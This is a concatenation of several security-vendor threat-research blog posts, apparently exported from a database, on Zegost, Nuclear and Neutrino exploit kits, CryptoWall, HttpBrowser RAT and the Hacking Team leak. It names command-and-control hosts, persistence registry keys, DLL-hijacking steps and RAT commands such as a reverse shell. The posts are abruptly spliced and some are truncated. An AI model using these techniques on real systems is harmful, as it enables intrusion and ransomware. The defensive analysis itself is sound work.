In past two months, we\'ve spotted multiple instances of Zegost Backdoor Trojan installation attempts leveraging Hacking Team\'s Adobe Flash exploit (CVE-2015-5119) payload. These attacks do not appear to be targeted, but the payload involved in the infection cycle has some resemblance to recent APT payloads from HttpBrowser & the PlugX RAT family.    Attack Chain  The infection cycle starts with a legitimate Chinese real estate and shopping site www[.]kongquechang[.]com, which appears to have been compromised by the attackers and contains an injected script. The injected script will cause a series of redirects leading to Hacking Team\'s exploit payload as seen in Figure 1. The majority of users were led to the original compromised site following a Baidu search.       	  		  			  		  		  			Figure 1: Compromised Chinese real estate & shopping site  		  	    The site www[.]kongquecheng[.]com is still infected but the exploit server appears to be down at the time of writing this blog. Attackers are abusing the Chinese URL shortening service t.cn to redirect victims to the attack server and also Baidu\'s URL shortening service dwz.cn to deliver the Adobe Flash exploit payload as seen below:       	  		  			  		  		  			  			  				  					  						Figure 2: Zegost Backdoor Attack Chain  					  				  			  			  		  	         The Flash exploit payload (CVE-2015-5119) involved here is from the Hacking Team\'s leaked archive with updated shellcode. Upon successful exploitation, the embedded shellcode will trigger the download and execution of the Zegost executable from a predetermined location.       	  		  			  		  		  			Figure 3: Hacking Team\'s Adobe Flash Exploit  		  	           	  		  			  		  		  			Figure 4: Embedded shellcode to download & install Zegost  		  	      Zegost Payload Iterations  During the course of our monitoring we observed the attackers switch the malware payload multiple times.    Payload Type #1 - APT RAT like Zegost Installer    Filename:  svhost.exe    MD5:  E04F3C9C2F7BE694628AECCD23E8839D    The Zegost payload was being delivered as part of an installer archive, which is similar in structure to the APT RAT PlugX and HttpBrowser as detailed here. The downloaded installer was svhost.exe, which has following file structure:       	  		  			  		  		  			Figure 5: APT RAT like Zegost installer archive  		  	    The Zegost installer is responsible for dropping the above three files and running the legitimate Ping_Master_Pro utility DATA.exe. The legitimate binary contains the data.dll in the import table, ensuring that the DLL will be loaded before it runs. The data.dll that gets loaded in this case, will be a fake VirtualBox display driver DLL file present in the same directory and it will patch the entry point of the main executable (DATA.exe) file with a jump instruction to run the DLL’s code instead. This technique is also known as DLL Hijacking which ensures that the fake display driver DLL gets loaded by abusing the Windows DLL load order. The DLL’s code is responsible for decrypting and running the Zegost Backdoor payload from the fafentuqiang.png file in the same memory space of the benign executable.    We observed a bug in the persistence module for this payload, which resulted in an incorrect path getting added to the registry entry created by the malware. The result was that upon system reboot the user\'s machine will no longer be infected with the Backdoor Trojan.    Payload Type #2 - Vanilla Zegost    Filename:  svhost.exe    MD5:  8F3B2C449793BC1538328CCC9BDC9CCD  62C705A0232EA6D4E3E3CE93F7506ACC    A modified Zegost payload was being delivered in decrypted form abandoning the installer archive structure. This payload was recently compiled and purports to be a XLLuaRuntime Dynamic Link Library file as seen below:       	  		  			  		  		  			Figure 6: Recently compiled Zegost payload  		  	             	  		  			  		  		  			Figure 7: Zegost payload file meta data  		  	    During our analysis we noticed that the persistence issue that existed in the previous iteration was resolved in this payload and the malware successfully remained active upon system reboot.    Zegost Infection Cycle      	Zegost Trojan drops a copy of itself in the Windows system directory as %SYSTEMDIR%\\Autoexec.exe        	It creates the following registry key to ensure persistence upon system reboot:        HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ Nobug = %SYSTEMDIR%\\Autoexec.exe        	We also saw an alternate code for achieving persistence by registering a new Windows Service:        HKLM\\SYSTEM\\CurrentControlSet\\Services\\        ServiceName - DirectX dwx        DisplayName - DirectX Remover auy for Windows(R).        ImagePath - %SYSTEMDIR%\\Autoexec.exe        	The Trojan reports the infected system information to a predetermined remote server at the following location:        Domain - www[.]svshot[.]com        Server IP - 123.57.54[.]57        Server Port - 8999        	The Command & Control server domain used in this attack was recently registered and points to a dedicated server hosted on the shady Chinese autonomous system - AS37963 (CNNIC-ALIBABA-CN-NET-AP) as seen below:        	  		  			  		  		  			Figure 8: Command & Control server hosted in China  		  	      The same server is also used for the initial Adobe Flash exploitation attempt.    Conclusion  Hacking Team\'s exploit payloads remain a popular choice among cyber criminals for weaponizing their payloads. This is the first instance of the Zegost Backdoor Trojan being delivered using Hacking Team\'s exploit. The Zegost Backdoor payload iterations we observed in this attack chain indicates that the author is testing out new payloads.    Zscaler’s ThreatLabZ has confirmed coverage for these exploits and for the Zegost variants, ensuring protection for organizations using Zscaler’s Internet security platform.

This is followed by a series of redirects leading to download of spyware or potentially unwanted applications (PUA) masquerading as legitimate applications.       	  		  			  		  		  			Figure 7: Redirects from Latvia VPS server leading to PUA download  		  	                                   Fake Flash Player - Win32.InstallCore    In one of the cases, we observed the user is prompted to update the Flash Player as seen below:           	  		  			  		  		  			Figure 8: Out of date Flash Player warning  		  	    The page prompts the user to update or install a new flash player update. Regardless of the option the user selects, a fake Adobe Flash Player application is downloaded.

ThreatLabZ recently encountered a Nuclear campaign originating from a variety of compromised sites. These compromises continue the trend of WordPress sites serving malcode, and in this case included the web-presence of a UK-based healthcare organization.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Example of recent Nuclear landing page to exploit cycle\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nThe execution flow of this campaign is typical: an infected site includes an embedded iframe that loads the exploit kit landing page. The landing page checks the browser family and version and tests the available Flash version before choosing one of several exploit payloads. From here, multiple possible payloads may be downloaded, particularly Fareit Infostealer Trojan and Troldesh Ransomware Trojan.\r\n \r\nNuclear Landing\r\nAs covered recently, WordPress continues to be one of the most effective traffic sources for exploit kits. However, the majority of traffic we have seen does not feature the visitorTracker component, but merely includes a hidden iframe in the footer of the WordPress page.\r\n \r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			The malicious iframe is preceded by a large number of blank lines\r\n		\r\n	\r\n\r\n\r\n\r\nThe iframe loads the landing page, which features obfuscated JavaScript and random-looking text blocks. It turns out that some of the random looking text blocks are actually obfuscated components that the JavaScript eventually deobfuscates and executes.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Lines 7 and 9 are overlaid with the script invocations that decode the HTML blocks\r\n		\r\n	\r\n\r\n \r\n\r\nNuclear Exploit Payloads\r\nThe landing pages we evaluated led to two possible Flash exploits as well as one Internet Explorer exploit. Specifically, we saw CVE-2015-5122 and CVE-2015-5560 exploits for Flash, and a highly obfuscated CVE-2014-6332 exploit for IE.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			The first Flash payload stage checks Flash Player version and prepares the appropriate exploit\r\n		\r\n	\r\n\r\n\r\nAs noted by Kafeine, Nuclear has integrated the same Diffie-Hellman Angler first pioneered, only now it is implemented in Flash to protect the CVE-2015-5560 payload. This campaign also features an XTEA function with modified constants.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			A Diffie-Hellman key exchange implementation is used to protect the new Flash payload\r\n		\r\n	\r\n\r\n\r\nBesides making reverse engineers lives harder, the authors have also decided to include some friendly shoutouts to those analyzing their code. In the case of the featured Flash payloads, the string \"fuckAV\" is used as a special constant.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			This function returns an XOR key when \"fuckAV\" is supplied as a parameter\r\n		\r\n	\r\n\r\n\r\nNuclear Fallout\r\nOnce the browser is exploited, Nuclear first drops a Fareit payload. Fareit is an infostealer, and as can be seen in the strings below, is looking to steal user credentials for multiple applications and websites as well as BitCoin wallet information.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			A sample of the files and paths Fareit checks for user credentials\r\n		\r\n	\r\n\r\n\r\n\r\nWhile stealing users information, Fareit attempts to hide its command and control communication by sending its check-in request in the midst of a batch of HTTP requests to innocuous looking websites.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			After checking connectivity on MSN.com, multiple POSTs are performed\r\n		\r\n	\r\n\r\n\r\nIn addition to the Fareit payload, a Troldesh ransomware payload was also seen. Troldesh is yet another in the line of ransomware families that encrypt user files and attempt to extract a ransom payments in exchange for decryption keys. This campaign is using the email addresses files100005(at)gmail.com and files100006(at)gmail.com and the Tor address a4yhexpmth2ldj3v.onion.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Troldesh bundles a Tor proxy to protect its communication\r\n		\r\n	\r\n\r\n\r\n \r\nAlthough they might prefer to infect the machines of non-analysts, the Troldesh author does take the opportunity to greet their reverse engineer friends. This message is less aggressive than the greeting in the Nuclear flash payload.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Thanks, but I don\'t drink coffee!\r\n		\r\n	\r\n\r\n \r\n\r\nConclusion\r\nWhile Nuclear may not be the exploit kit that regularly debuts the latest advances, the authors certainly make an effort to keep up with new exploits and new obfuscation techniques. ThreatLabZ will continue to monitor Nuclear (and Fareit and Troldesh) for any new developments or greetings.\r\n\r\n\r\n \r\nAppendix:\r\n\r\nIndicators:\r\n \r\n\r\n\r\n	Recent landing page IP addresses\r\n	Recent landing page hostnames\r\n	Recent compromised sites and redirectors', 'Exploit Kit;Malware;Ransomware;Vulnerability', 'https://www.zscaler.com/blogs/research/update-nuclear-reverse-engineering');

Rebooting the device does not work in such cases as ransomware app becomes active immediately after reboot, which leaves no scope for the victim to get into device \"settings\" and uninstall the ransomware.    In such scenarios, it can be removed by using the following steps:       	Boot device into safe mode (Please note that entering \"safe mode\" varies depending on your device). Safe mode boots the device with default settings without running third party apps.  	Uninstalling ransomware from device requires you to first remove administrator privilege. To do the same, go to Settings --> Security --> Device Administrator and select ransomware app, then deactivate.  	Once this is done, you can go to Settings --> Apps --> Uninstall ransomware app.      Prevention:  To avoid being victim of such ransomware, it is always best to download apps only from trusted app stores, such as Google Play. This can be enforced by unchecking the option of \"Unknown Sources\" under the \"Security\" settings of your device.', 'Analysis;Mobile', 'https://www.zscaler.com/blogs/research/more-adult-themed-android-ransomware');

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (129, 'Neutrino Campaign Leveraging WordPress, Flash For CryptoWall', 'ThreatLabz', 'August 20, 2015', 'Overview  Neutrino Exploit Kit (EK) appeared on the scene around March of 2013 and continues to remain active and incorporate new exploits. In the beginning of July, Neutrino reportedly incorporated the HackingTeam 0day (CVE-2015-5119), and in the past few days we\'ve seen a massive uptick in the use of the kit. The cause for this uptick appears due to widespread WordPress site compromises.    ThreatLabZ started seeing a new campaign where WordPress sites running version 4.2 and lower were compromised, and the image below illustrates the components involved in this campaign.       	  		  			  		  		  			Fig 1. Complete Neutrino WordPress campaign  		  	      In analyzing the infection cycle, there are multiple recent changes in the Neutrino code, some that are normally characteristics of Angler Exploit Kit, but others that remain unique to Neutrino.  WordPress Compromises  Similar to Angler Exploit Kit, the new wave of Neutrino is targeting outdated versions of WordPress. In fact, we have seen over 2600 unique WordPress sites being used in this campaign where more than 4200 distinct pages have been logged with dynamic iframe injection in the last month. As mentioned, all the targeted websites were running WordPress version 4.2 and lower.       	  		  			  		  		  			Fig 2. Event timeline overview  		  	      The goal of this campaign is to completely and fully compromise the site, which includes adding a webshell, harvesting credentials, and finally injecting an iframe that loads a Neutrino landing page. The iframe is injected into the compromised site immediately after the BODY tag, and is almost identical to recent Angler samples. Compare these recent Neutrino and Angler samples below.       	  		  			  		  		  			Fig 3. Neutrino on the left, Angler on the right  		  	      The code specifically targets Internet Explorer, so those using other browsers won\'t be served the iframe, and a cookie is used to prevent serving the iframe multiple times to the same victim.    The actual Neutrino landing pages are retrieved on the backend through the injected php code, a sample of which is below:       	  		  			  		  		  			Fig 4. Injected php code  		  	      Note the base64 encoded value boxed in red above; this decodes to the URL below, where X, Y, and Z are integers:  http://93.171.205.64/blog/?bf4z&utm_source=XXXXX:YYYYYY:ZZZ  This URL is used to retrieve an updated landing page URL, and we\'ve noted that the URLs change very frequently. Additionally, the primary IP hosting the majority of landing page domains is \'185.44.105.7\' which is owned by VPS2DAY.com. We reached out to them via email briefly explaining what we were seeing and received no response.    Neutrino Landing Page  The landing page has been updated and contains some JavaScript that only declares variables, and then a flash loader:       	  		  			  		  		  			Fig 5. Neutrino landing page  		  	      If flash isn\'t installed on the victim machine, an old flash cab is pushed to the user prior to serving the malicious SWF. Note the departure from using base64 encoded data blobs, or really using very much code at all on the landing page.     Neutrino SWF  Past versions of the Neutrino SWF contained multiple exploit payloads encrypted via RC4. Examining this SWF shows that things have apparently changed as the structure is very different:       	  		  			  		  		  			Fig 6. SWF structure  		  	      Taking a look at the code shows that instead of RC4, there is a decode function that uses the input of one binary data blob to decode a second binary blob; the decoded data reveals a second SWF:       	  		  			  		  		  			Fig 7. Decode function for embedded SWF  		  	      Detection results for the SWF are very poor with only one vendor detecting it:       	  		  			  		  		  			Fig 8. Poor detection results on SWF  		  	      Carving out the embedded SWF and analyzing it shows a much more familiar structure for Neutrino, with some additional enhancements. Notably similar is the use of multiple embedded binary blobs that are RC4 encrypted:       	  		  			  		  		  			Fig 9. Binary data inside embedded SWF  		  	           	  		  			  		  		  			Fig 10. Script data inside embedded SWF - characteristic of Neutrino  		  	      These binary blobs contain multiple payloads, and this has been analyzed and documented in the past, notably by Kafeine and Dennis O\'Brien on Malwageddon. However, unlike past Neutrino SWFs, the RC4 keys are no longer in cleartext and decoding them requires tracing through multiple function calls. The ActionScript structure is still very recognizable though:       	  		  			  		  		  			Fig 11. Decoder for one binarydata \'exploitWrapper\' blob  		  	    Detection on the embedded SWF is also quite poor.      	  		  			  		  		  			Fig 12. Embedded SWF VT detection  		  	         Payload  Successful exploitation of a victim leads to an encrypted executable download. The binary is decrypted and begins beaconing almost immediately:       	  		  			  		  		  			Fig 13. Initial beacon summary  		  	        	  		  			  		  		  			Fig 14. Full beacon/response sample  		  	            Looking at the traffic, we can immediately see this is CryptoWall 3.0. Sure enough, a couple minutes later we see the all too familiar \'HELP_DECRYPT\' page and see connections out to the payment servers:       	  		  			  		  		  			Fig 15. Payment server connections  		  	           	  		  			  		  		  			Fig 16.

This campaign also reconfirms that Neutrino Exploit Kit activity is on the rise and is still a major player in the exploit kit arena.

The ‘Emissary Panda’ APT group has been known to target the government and technology sectors with the intent to monitor and steal intellectual property data.\r\n\r\nThere were multiple global clients targeted in the last month that belong to following industry verticals:\r\n\r\n	Financial Services\r\n	Energy\r\n	Pharmaceutical\r\n\r\n\r\nAttack Chain\r\n\r\n\r\nAs noted before, this was the first instance of the ‘Emissary Panda’ group weaponizing malware payloads using the 0-day exploits found in the leaked Hacking Team archives.

As such, this new attack represents a dangerous new hybrid combining the work of a notorious cyber criminal gang with Chinese cyber espionage group to attack a financial services firm.          Zscaler\'s cloud sandboxes recently detected a Remote Access Trojan (RAT) being delivered by a well-known Chinese cyber espionage group using the Hacking Team’s 0-day exploits. This attack was specifically targeting a well-known financial services firm. The exploit files involved were identical to the Hacking Team\'s leaked exploit HTML, JavaScript, and ShockWave Flash 0-day files. The end payload that was installed is the HttpBrowser RAT, known to be used by the Chinese group in previous targeted attacks against governments.           	  		  			  		  		  			Figure 1: Chinese APT attack cycle to plant HttpBrowser RAT  		  	           Hacking Team Exploits    The attack involved targeted users visiting a malicious URL delivered via a spear phishing attack. The malicious URL points to a remote server located in Hong Kong (IP Address - 210.209.89.162) that downloads and executes a malicious ShockWave Flash payload through a specially crafted HTML & JavaScript. The exploit files involved are identical to the ones that we found during our analysis of the Hacking Team leaked code as seen below:           	  		  			  		  		  			Figure 2: Resemblance with Hacking Team\'s exploit HTML  		  	           	  		  			  		  		  			Figure 3: Resemblance with Hacking Team\'s SWF exploit  		  	      The Adobe ShockWave exploit (CVE-2015-5119) if successful will download and install a variant of the HttpBrowser RAT from the same Hong Kong based server which eventually also serves as the Command & Control (C&C) server.           	  		  			  		  		  			Figure 4: Hong Kong based server used in the attack [credit: domaintools.com]  		  	      Malware Payload - HttpBrowser RAT    HttpBrowser is a RAT that has become extremely popular in past two years among the APT adversaries, leveraged in various targeted attacks. The RAT has been leveraged as the primary payload by the APT group that is also known to install the nasty Backdoor PlugX RAT during lateral movement in the victim environment after compromise.         The HttpBrowser payload used for the attack was compiled just few days before the attack as seen below:      	  		  			  		  		  			Figure 5: HttpBrowser payload compilation time  		  	      The HttpBrowser installer archive structure is very similar to that observed in previous PlugX attacks. The installer archive in our case was svchost.exe (saved as xox.exe) that consisted of the following three files:             	VPDN_LU.exe - A legitimate digitally signed Symantec Antivirus executable to evade detection        	  		  			  		  		  			Figure 6: Legitimate Symantec Antivirus executable used in the attack   		  	        	navlu.dll - A fake Symantec DLL to decrypt and run the HttpBrowser RAT  	navlu.dll.url - Encrypted HttpBrowser RAT payload        The HttpBrowser RAT installer is responsible for dropping the above three files and running the legitimate Symantec Antivirus binary VPDN_LU.exe. The legitimate binary contains the navlu.dll in the import table ensuring that the DLL will be loaded before it runs. The navlu.dll that gets loaded in this case will be the fake Symantec DLL file present in the same directory and it will patch the entry point of the main executable file with a jump instruction to run the DLL’s code instead.            	  		  			  		  		  			Figure 7: Legitimate executable entry point patched  		  	    This technique is also known as DLL Hijacking which ensures that the fake Symantec DLL gets loaded by abusing the Windows DLL load order. The DLL’s code is responsible for decrypting and running the HttpBrowser RAT payload from the navlu.dll.url file in the same memory space of the benign executable. The decryption routine consist of an incremental XOR as seen below:           	  		  			  		  		  			Figure 8: Incremental XOR routine to decrypt RAT payload  		  	      The HttpBrowser installer structure ensures that the malware evades detection by running in the context of the legitimate signed binary. This also ensures that the malicious DLL will not run by itself in automated analysis environments.         The malware then deletes the original installer file and moves the dropped files to the following location:        	%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe  	%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\navlu.dll  	%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\navlu.dll.dll        The malware also creates the following registry entry to ensure persistence:        	HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn “%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe”        Command & Control communication    The HttpBrowser RAT variant was configured to connect to the following Command & Control server upon successful infection:        	update.hancominc[.]com:8080        It relays the following information of the victim machine in an encrypted format over SSL:    /loop?c=<computerName & userName>&l=<IP Address>&o=<Operating System details>&u=<GUID>&r=<Injection Status (Boolean)>&t=<Running Time>    The commands supported by this RAT variant are:             	  		  			  			Command  			  			  			Description  			  		  		  			  			init  			  			  			start reverse shell and send list of drives on infected system.  			  		  		  			  			setcmd  			  			  			change the default (cmd.exe) shell  			  		  		  			  			settime  			  			  			Set sleep time  			  		  		  			  			uninstall  			  			  			uninstall itself  			  		  		  			  			write  			  			  			write command to shell  			  		  		  			  			list  			  			  			Send list of files and folders to C&C  			  		  		  			  			upload  			  			  			Download file from C&C  			  		  		  			  			down  			  			  			Upload file to C&C  			  		  	                                                                                             Here are some sample decrypted C&C transactions from the HttpBrowser RAT:           	  		  			  		  		  			Figure 9: List of drives sent as part of the init command  		  	           	  		  			  		  		  			Figure 10: List of files sent as part of the list command  		  	        Conclusion    HttpBrowser RAT, due to the range of features including SSL based C&C channel, anti-detection & anti-analysis techniques, remains the popular malware of choice for APT attacks. There have been multiple instances where this RAT co-existed with PlugX RAT on the compromised network indicating an APT adversary group with a set attack tool arsenal. The network infrastructure leveraged in this attack against the financial services firm shows involvement of a previously known Cyber espionage APT group of Chinese origin. The main motive of this group is to monitor and exfiltrate intellectual property data from the target organization.         Zscaler’s ThreatLabZ has confirmed coverage for these exploits and for the HttpBrowser variant, ensuring protection for organizations using Zscaler’s Internet security platform.

Search poisoning is used to bait users into installing the scamware, with the lures including cracked and legitimate software, pirated music and movies, as well as other documents and files that a user might be seeking.           	  		  			  		  		  			This installer pretends to help speed up your downloads  		  	           After taking the bait and executing the file, the user is presented with one of several typical-looking installer dialogs that promise to deliver what the user was originally searching for. Whether the user realizes the mistake or not, the “installer” will proceed to fetch multiple encrypted payloads from a remote webserver. The installation of the payloads continues even if the user clicks the various “Decline”, “Cancel”, or “Exit” buttons. Throughout the process, the scamware also gathers system information and sends it to remote webservers.           	  		  			  		  		  			Data sent to remote servers via HTTP POST  		  	           Several typical components of the scamware include a payload called ‘compfix’ that is installed as a system service to be run at boot time, as well as a payload called ‘SystemStrengthener’.           	  		  			  		  		  			\'compfix\' installed as a service  		  	              Besides the benevolent sounding payloads mentioned above, the scamware makes a few changes to the user’s Browser configuration. If Chrome is installed, two DLLs are dropped into the Chrome installation directory that appear to be modified and slightly outdated versions of ‘chrome.dll’. Chrome and Internet Explorer also receive browser extensions that spy on user behavior and serve ads. As a bonus, the IE add-ons are marked as uninstallable without Administrator approval.         	  		  			  		  		  			Modified Chrome DLLs with invalid certs  		  	             	  		  			  		  		  			User is prevented from disabling scamware addons  		  	             	  		  			  		  		  			User is prevented from disabling scamware addons  		  	             	  		  			  		  		  			New Chrome addons installed without notice  		  	         Apart from some additional obfuscation layers compared to previous versions, the technical aspects of this malware are fairly standard. However, the breadth of the hosting network and the pattern of code signing certificates used, made this an interesting campaign. We uncovered 33 unique certificates, all issued from the same Certificate Authority: Certum / Unizeto Technologies. (Note: we also identified other adware campaigns utilizing Certum certificates, though they appeared to be unrelated.)             	  		  			  		  		  			Unizeto Technologies / CERTUM issued certificates (Node Legend -- Yellow: Issuer, Blue: Signer)  		  	             These 33 certificates were used to sign 2,783 pieces of scamware that were hosted on 447 unique hosts (323 unique domains). While it\'s normal for adware campaigns that utilize code signing to rotate through their certificates as they are blocked by AV and security companies, the volume of unique signing certificates in use signals that something is different here. Additionally, the data in the signatures indicates that all of the certificates are owned by individual persons with free email accounts. This hinders naive blacklisting as well as attribution, since there is no clear way to link the campaign to a specific organization.        	  		  			  			  			  		  		  			Overview of the Scamware Network (Node Legend -- Yellow: Issuer, Blue: Signer, Red: Host, Pink: Domain, Green: File-MD5)  		  	      Given the nature of this MultiPlug campaign, it is easy to hypothesize that the organization behind it has more evil-intent than the usual adware/scamware operators. That said, it could just be a matter of the organization trying to maximize their ROI for this large infrastructure they operate. Regardless of their intentions, enterprises should be wary of even the most innocuous looking adware due to the ability to perform system and network reconnaissance, achieve persistence on infected hosts, deliver arbitrary payloads, and take control of the system, its applications, and its data.', 'Malware', 'https://www.zscaler.com/blogs/research/anatomy-scamware-network-multiplug');

In this blog, we will be looking at the CVE-2015-5119 exploit payload that we have now seen in the wild. The sample has multiple layers of obfuscation and packer routines. The malicious Flash payload is packed, XOR\'ed and stored as a binary data inside a parent Flash file that dynamically unpacks a malicious Flash file and writes it to memory at run time.       Here is the structure of the CVE-2015-5119 exploit payload:                  Packages, properties and method names are stored in variables for obfuscation:                    Here we observe the calling of the unpack routine to decrypt the embedded SWF exploit payload:                  An XOR key is used for unpacking and is hardcoded and assigned to the variable vari_10. This is what the unpacked content looks like:                       Upon decompilation, it is apparent that majority of the codebase, including variable names and function names are the same as what we saw in the leaked source by the Hacking Team. The public exploit also has checks for:           	Presence of a debugger  	Operating System bitness (32-bit or 64-bit)                    When the program execution starts, the ActionScript looks for the input parameters and based on it, sets a variable which is then sent to the main exploitation routine as seen below:                    The TryExpl() routine allocates sequential pages of memory and begins the exploit cycle:                       The vulnerability lies in making use of the valueOf property and corrupting the vector space so that the valueOf  property will overwrite the length field of the vector object, which will be further used to get access to vtables.         Here is explicit definition of valueOf function                  prototype.valueOf() is setting up the length of the ByteArray to 4352         Once the memory allocation is done, a MyClass object is created and assigned to _ba[3]. The    valueOf()  function defines the length of ByteArray to 4352, which is greater than the length of the object created, causing reallocation of bytes inside the memory.                       If the value of _ba[3] is set to zero after the assignment then it was successful in triggering a Use After Free vulnerability. The exploit code looks for the kernel32.VirtualProtect() (VP) function in the corrupted vector space as seen below:                  A call to the VP function is made, which replaces the vtable pointer and sets the PAGE_EXECUTE_READWRITE permission before executing the final payload.                           Hashes of  CVE-2015-5119 exploit payloads seen in the wild:                	061c086a4da72ecaf5475c862f178f9d  	079a440bee0f86d8a59ebc5c4b523a07  	16ac6fc55ab027f64d50da928fea49ec  	313cf1faaded7bbb406ea732c34217f4  	6d14ba5c9719624825fd34fe5c7b4297  	  	  	  	  	  	  	   	   	   	   	            Conclusion    It will be a challenge for security vendors to get container file detection in place as majority of the time, the embedded content is highly obfuscated with multiple levels of packing.

Introduction    Data breaches have become a common and painful reality. Major enterprises, including retailers and financial institutions have been affected in the past few years. Even cyber criminals are not spared from breaches, with various malware code leaks, the most recent being that of the KINS 2.0 Banking Trojan family.         Earlier this week, we saw a large stolen information archive (400 GB) being published that belonged to the notorious Italian hackers-for-hire firm - Hacking Team. Hacking Team has been known to sell offensive surveillance technology to government agencies worldwide. The archive contains e-mails, invoices, and more importantly exploits & malware source codes. An individual that goes by the handle PhineasFisher has taken credit for the attack and if that name sounds familiar it\'s because he\'s done similar work before, having hacked and leaked data from Gamma International last year. His motivation for that breach was apparently similar as he accused the firm of selling surveillance tools to repressive regimes. While our assessment is far from over, in this blog, we will provide a quick run down of what we have seen in the archive related to exploits & malware thus far and we will continue to update as we discover more details.    Exploits, Remote Control System, and more        	Flash 0-day exploit with Proof-Of-Concept (POC) [CVE-2015-5119] - Confirmed 0day for the latest version of Adobe Flash Player, running on Windows XP and Windows 7. The exploit did not succeed on Windows 8.1. We also saw support for targeting OS X. This is a Use-After-free vulnerability in Adobe Flash player\'s built-in ByteArray class that can lead to crash or remote code execution by the attacker.       Affected applications:        	The majority of the popular browsers including Chrome, FireFox, Internet Explorer and Safari with Flash Player installed are vulnerable to this issue.  	Microsoft Office 2007/2010/2013 - where the attack scenario will involve an office document with the malicious SWF file embedded in it. The document may arrive via an e-mail or as a drive-by download on the target system.        Adobe released a patch today to address this vulnerability.      	Microsoft Windows Kernel code injection vulnerability exploit that can be leveraged to perform privilege escalation on the target system to bypass various security mechanisms        	Support for iOS devices - They are leveraging the popular iOS Jailbreak application Cydia for iOS devices to further install malicious payloads on the target device.        	Support for Android Devices - There is a separate module for Android OS (Android Webkit) that is leveraging a probable 0day exploit [we are still working on confirming this] in the Android browser and running various known root-access exploits like exynos, gingerbreak, levitator, etc. to root the target devices and further install malicious payloads.         	Support for Windows & Blackberry devices - We also saw source code for supposed exploits that will target Windows Phone 8 as well as Blackberry devices.         	MacOS Rooting exploit to enable online and offline installation of untrusted applications.        	A Remote Control System (RCS) Dropper module that is capable of creating both mobile and computer system payloads for Windows and Macintosh.         	A multi-stage JAVA exploit module that contains a weaponized version as well as a two stage version with features to by pass Microsoft Security Essentials and an example Trojanized Putty.exe payload.        	Multiple driver files that may contain Rootkit functionality to hide the malicious process and evade detection.        	Source code of the core Remote Control System module where we can see the in-depth list of features supported by it.      core-win32:    1.) Monitoring modules for Instant messengers, Web Browsers, PC cameras & microphones, etc.  2.) Monitoring social media activities over Yahoo, Gmail, Twitter, and Facebook  3.) Hooking Outlook and getting email and contact details.  4.) Relaying infected system information including time, battery status, processor, memory, OS, user etc..  5.) Advanced keylogging capabilities     We also observed support for 64-bit operating system target.      	There are also multiple anti-VM, anti-Sandbox, and anti-AV evasion modules present in the source code archive.      We are still combing through the archive evaluating more exploits and we will continue to publish our findings as they emerge.    Loader configuration server    We saw a hardcoded IP address in the first stage shellcode payload that is supposedly hosting the configuration file as seen below           	  		  			  		  		  			Hardcoded configuration file location  		  	           The shellcode payload is presumably used by the loader for downloading and installing the main RCS component following a successful exploitation attempt. A quick VirusTotal lookup for the IP address reveals lot of interesting activity in the past two months only:           	  		  			  		  		  			VirusTotal report for the Configuration Server  		  	      Enterprises would be advised to block the aforementioned IP address if they are concerned that they may have been targeted by any of the Hacking Tools applications.    Conclusion    As has been the case in the past after any such leak, we will start seeing the leaked code being incorporated into many future spin offs as well as existing malware families as feature upgrades. Exploit Kit authors have already incorporated the Flash 0day payload in their exploit arsenal as noted here.         ThreatLabZ has ensured coverage for the Flash 0day (CVE-2015-5119) and other exploit payloads ensuring protection for the Zscaler customers.

The original data is of the format  {1|crypt4|UniqueMD5Hash|2|1|2|PublicIP}    - \"crypt4\" string represents the Campaign ID  - \"UniqueMD5Hash\" is calculated from Computer Name, Volume Serial Number, Processor & OS information  The RC4 key is generated by doing a simple alpha-numeric sort on a string stored inside the binary as seen in the screenshot below. The unsorted RC4 key is also sent as part of the POST request.       	  		  			  		  		  			RC4 Key encrypted POST request to C&C server  		  	        The malware then performs another POST request and in response it gets RC4 encrypted Tor domain & public key to use for encrypting the victim files. The Tor domain is leveraged for the decryption instruction. Screenshots below, show the original communication & decrypted response:         	  		  			  		  		  			C&C communication - Requesting Public Key  		  	             	  		  			  		  		  			C&C communication - Decrypted response with public key  		  	      Upon successful encryption of the files on the victim machine using the public key, it reports back the number of files that were encrypted to the C&C server. The information collected by the C&C server is leveraged to present a more personalized decryption instruction page that includes user\'s operating system, public IP address, and the number of files encrypted as seen below.       	  		  			  		  		  			Personalized ransom payment page  		  	    The ransom amount requested in our case was $500 USD and to prove authenticity, the malware authors also offer the victim a \"Decrypt 1 file for FREE\" option, which is limited to a 512 kilobyte file.    Below is the geo distribution of the CryptoWall C&C servers we oberved in the past week:       	  		  			  		  		  			CryptoWall C&C servers  		  	           	  		  			  		  		  			CryptoWall C&C country distribution  		  	      Compromised WordPress sites used for C&C communication  We are also seeing an increase in the number of compromised WordPress sites being used for CryptoWall C&C communication. Below are some of the locations where the malicious scripts are being hosted on these servers:      	/wp-content/plugins/revslider/temp/update_extract/  	/wp-content/uploads/wpallimport/uploads/  	/wp-content/themes/pptitan/    You can get full list of the Compromised WordPress sites that we have oberved in past one week here.    Conclusion  CryptoWall remains a potent threat to enterprises and individual users alike. Traditional AntiVirus applications continue to struggle against this nasty strain of ransomware, as once the infection is successful, there is very little AV vendors can do, even by adding signatures reactively. A hybrid and multi-layered security approach is required to counter this threat.    Taking regular backup remains the most effective counter measure against ransomware.

